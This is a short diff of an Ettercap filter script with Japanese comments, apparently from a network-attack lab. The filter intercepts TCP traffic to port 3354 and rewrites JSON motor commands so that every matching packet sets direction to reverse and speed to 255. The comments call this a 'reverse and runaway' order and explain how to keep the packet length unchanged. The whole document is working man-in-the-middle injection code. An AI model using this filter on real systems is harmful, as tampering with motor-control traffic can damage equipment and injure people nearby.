@@ -1,5 +1,13 @@
-if (ip.proto == TCP && tcp.dst == 3345) {
-   replace("\"dir\": 0", "\"dir\": 1");
-   pcre_regex(DATA.data, "{\"motor\": (\d), \"dir\": (\d), \"speed\": (\d+)}", "{\"motor\": $1, \"dir\": $2, \"speed\": $3}");
+# TCPで宛先が3354ポートのパケットの場合に処理を行う．
+if (ip.proto == TCP && tcp.dst == 3354) {
+   # pcre_regexはPerlの正規表現と同様の処理を行う正規表現処理関数．
+   # http://www.pcre.org/
+   # https://www.kali.org/tools/ettercap/
+   
+   # パケットのデータが {"motor": 0, "dir": 0, "speed": 123} のようなJSONフォーマットの文字列の場合，
+   # "dir"の値を 1 にし，　"speed"の値を 255 と，反転かつ暴走の指令に書き換える．
+   # 単純に書き換えてしまうと， "speed"の値が3桁未満の場合に元々のデータ長からはみ出してしまうので，
+   # ","と":"の後ろの空白を削って2文字分の余裕を稼いでいる．
+   pcre_regex(DATA.data, "{\"motor\": (\d), \"dir\": (\d), \"speed\": (\d+)}", "{\"motor\": $1, \"dir\": 1,\"speed\":255}");
    msg("Filter Ran.\n");
 }
